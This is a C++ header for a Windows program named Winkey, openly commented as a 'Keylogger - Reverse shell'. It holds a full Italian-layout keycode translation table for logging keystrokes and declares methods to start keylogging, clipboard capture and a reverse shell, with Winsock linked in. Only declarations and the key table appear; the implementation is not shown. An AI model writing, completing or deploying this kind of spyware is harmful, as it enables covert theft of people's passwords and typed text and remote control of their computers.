#ifndef WINKEY_HPP
# define WINKEY_HPP

# include <iostream>  // For standard I/O
# include <winsock2.h> // For Winsock functions
# include <windows.h>  // For Windows API functions
#include <Tlhelp32.h>
#include <time.h>
#include <unordered_map>
#include <cctype> // Include for std::toupper

# include <windows.h>
# include <winuser.h>
# include <winsock2.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "User32.lib")

char	keys[2][256][20] = {
{
	"", "", "", "", "", "", "", "", "{BACKSPACE}", "{TAP}",
	"", "", "{CLEAR}", "{ENTER}", "", "", "{SHIFT}", "{CTRL}", "{ALT}", "{PAUSE}",
	"{CAPSLOCK}", "", "", "", "", "", "", "{ESC}", "", "",
	"", "", " ", "{PAGUP}", "{PAGDOWN}", "{END}", "{HOME}", "{LEFT}", "{UP}", "{RIGHT}",
	"{DOWN}", "{SELECT}", "{PRINT}", "{EXECUTE}", "{PRINTSCREEN}", "{INS}", "{DEL}", "{HELP}", "0", "1",
	"2", "3", "4", "5", "6", "7", "8", "9", "", "",
	"", "", "", "", "", "a", "b", "c", "d", "e",
	"f", "g", "h", "i", "j", "k", "l", "m", "n", "o",
	"p", "q", "r", "s", "t", "u", "v", "w", "x", "y",
	"z", "{LWIN}", "{RWIN}", "{APPKEY}", "", "{SLEEP}", "0", "1", "2", "3",
	"4", "5", "6", "7", "8", "9", "*", "+", "{SEP}", "-",
	".", "/", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8",
	"F9", "F10", "F11", "F12", "F13", "F14", "F15", "F16", "F17", "F18",
	"F19", "F20", "F21", "F22", "F23", "F24", "", "", "", "",
	"", "", "", "", "{NUMLOCK}", "{SCROLLLOCK}", "", "", "", "",
	"", "", "", "", "", "", "", "", "", "",
	"{LSHIFT}", "{RSHIFT}", "{LCTRL}", "{RCTRL}", "{LALT}", "{RALT}", "", "" , "" , "" ,
	"" , "" , "" , "" , "" , "" , "" , "" , "" , "",
	"", "", "", "", "", "", "è", "+", ",", "-",
	".", "ù", "ò", "", "", "", "", "", "", "",
	"", "", "", "", "", "", "", "", "", "",
	"", "", "", "", "", "", "", "", "", "'",
	"\\", "ì", "à", "", "", "", "<", "", "", "",
	"", "", "", "", "", "", "", "", "", "",
	"", "", "", "", "", "", "", "", "", "",
	"", "", "", "", "", ""
}, {
	"", "", "", "", "", "", "", "", "{BACKSPACE}", "{TAP}",
	"", "", "{CLEAR}", "{ENTER}", "", "", "{SHIFT}", "{CTRL}", "{ALT}", "{PAUSE}",
	"{CAPSLOCK}", "", "", "", "", "", "", "{ESC}", "", "",
	"", "", " ", "{PAGUP}", "{PAGDOWN}", "{END}", "{HOME}", "{LEFT}", "{UP}", "{RIGHT}",
	"{DOWN}", "{SELECT}", "{PRINT}", "{EXECUTE}", "{PRINTSCREEN}", "{INS}", "{DEL}", "{HELP}", "=", "!",
	"\"", "£", "$", "%", "&", "/", "(", ")", "", "",
	"", "", "", "", "", "A", "B", "C", "D", "E",
	"F", "G", "H", "I", "J", "K", "L", "M", "N", "O",
	"P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y",
	"Z", "{LWIN}", "{RWIN}", "{APPKEY}", "", "{SLEEP}", "0", "1", "2", "3",
	"4", "5", "6", "7", "8", "9", "*", "+", "{SEP}", "-",
	".", "/", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8",
	"F9", "F10", "F11", "F12", "F13", "F14", "F15", "F16", "F17", "F18",
	"F19", "F20", "F21", "F22", "F23", "F24", "", "", "", "",
	"", "", "", "", "{NUMLOCK}", "{SCROLLLOCK}", "", "", "", "",
	"", "", "", "", "", "", "", "", "", "",
	"{LSHIFT}", "{RSHIFT}", "{LCTRL}", "{RCTRL}", "{LALT}", "{RALT}", "", "" , "" , "" ,
	"" , "" , "" , "" , "" , "" , "" , "" , "" , "",
	"", "", "", "", "", "", "é", "*", ";", "_",
	":", "§", "ç", "", "", "", "", "", "", "",
	"", "", "", "", "", "", "", "", "", "",
	"", "", "", "", "", "", "", "", "", "?",
	"|", "^", "°", "", "", "", ">", "", "", "",
	"", "", "", "", "", "", "", "", "", "",
	"", "", "", "", "", "", "", "", "", "",
	"", "", "", "", "", ""
}
};

// Keylogger - Reverse shell
class Winkey {
	public:
		Winkey(void);
		~Winkey(void);


		void	startKeylogger();
		void	startReverseShell();
		void	startclipBoard(void);
		//DWORD WINAPI _reverseShell(LPVOID lpParam);
	private:
		
};

#endif